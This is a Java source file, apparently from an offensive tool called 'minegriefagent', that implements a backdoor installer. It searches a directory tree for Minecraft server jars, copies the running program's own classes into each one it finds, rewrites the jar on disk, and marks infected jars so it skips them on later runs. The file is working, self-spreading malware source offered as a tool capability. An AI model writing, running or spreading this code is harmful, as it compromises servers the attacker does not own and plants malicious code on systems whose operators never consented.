package com.chebuya.minegriefagent.capabilities;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayDeque;
import java.util.HashMap;
import java.util.Map;
import java.util.Queue;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

import static com.chebuya.minegriefagent.util.Filesystem.getFileExtension;
import static com.chebuya.minegriefagent.util.Filesystem.pathExistsInZip;
import static com.chebuya.minegriefagent.util.Logging.LOGGER;

public class Backdoor {
    public static void installBackdoor(String directory) {
        File root = new File(directory);
        if (!root.exists() || !root.isDirectory()) {
            LOGGER.warning("the backdoor search directory " + directory + " does not exist");
            return;
        }

        Queue<File> queue = new ArrayDeque<>();
        queue.add(root);

        LOGGER.info("searching filesystem for .jars");
        while (!queue.isEmpty()) {
            File currentDir = queue.poll();
            File[] files = currentDir.listFiles();

            if (files == null) {
                continue;
            }

            for (File file : files) {
                if (file.isDirectory()) {
                    queue.add(file);
                    continue;
                }

                if (!getFileExtension(file).equals("jar")) {
                    continue;
                }
                LOGGER.info("detected jar: " + file.getAbsolutePath());

                if (!pathExistsInZip(file.getAbsolutePath(), "net/minecraft/bundler/Main$FileEntry.class")) {
                    continue;
                }
                LOGGER.info("detected minecraft server jar: " + file.getAbsolutePath());

                byte[] zipData;
                try {
                    zipData = Files.readAllBytes(Paths.get(file.getAbsolutePath()));
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }

                Map<String, byte[]> zipFiles = unzipToMemory(zipData);

                Boolean skip = false;
                for (String fileName : zipFiles.keySet() ) {
                    if (fileName.equals("META-INF/MANIFEST.MF")) {
                        String manifest = new String(zipFiles.get(fileName));
                        if (manifest.contains("Backdoor")) {
                            LOGGER.info(file.getAbsoluteFile() + " already backdoored!");
                            skip = true;
                            break;
                        }
                    }
                }
                if (skip) {
                    continue;
                }

                String jarName = System.getProperty("sun.java.command");
                try {
                    zipData = Files.readAllBytes(Paths.get(jarName));
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                Map<String, byte[]> selfFiles = unzipToMemory(zipData);
                LOGGER.info("adding self into server jar");
                for ( String fileName: selfFiles.keySet() ) {

                    if (fileName.equals("net/minecraft/bundler/Main.class")) {
                        continue;
                    }

                    zipFiles.put(fileName, selfFiles.get(fileName));
                }

                zipFromMemory(zipFiles, file.getAbsolutePath());
                LOGGER.info("Backdooring success!");
            }
        }
    }

    private static void zipFromMemory(Map<String, byte[]> files, String outputPath) {
        try (FileOutputStream fos = new FileOutputStream(outputPath);
             ZipOutputStream zos = new ZipOutputStream(fos)) {

            for (Map.Entry<String, byte[]> entry : files.entrySet()) {
                ZipEntry zipEntry = new ZipEntry(entry.getKey());
                zos.putNextEntry(zipEntry);
                zos.write(entry.getValue());
                zos.closeEntry();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static Map<String, byte[]> unzipToMemory(byte[] zipData) {
        Map<String, byte[]> extractedFiles = new HashMap<>();

        try (ZipInputStream zis = new ZipInputStream(new java.io.ByteArrayInputStream(zipData))) {
            ZipEntry entry;
            byte[] buffer = new byte[4096];

            while ((entry = zis.getNextEntry()) != null) {
                if (!entry.isDirectory()) {
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    int len;

                    while ((len = zis.read(buffer)) > 0) {
                        bos.write(buffer, 0, len);
                    }

                    extractedFiles.put(entry.getName(), bos.toByteArray());
                    bos.close();
                }
                zis.closeEntry();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

        return extractedFiles;
    }
}
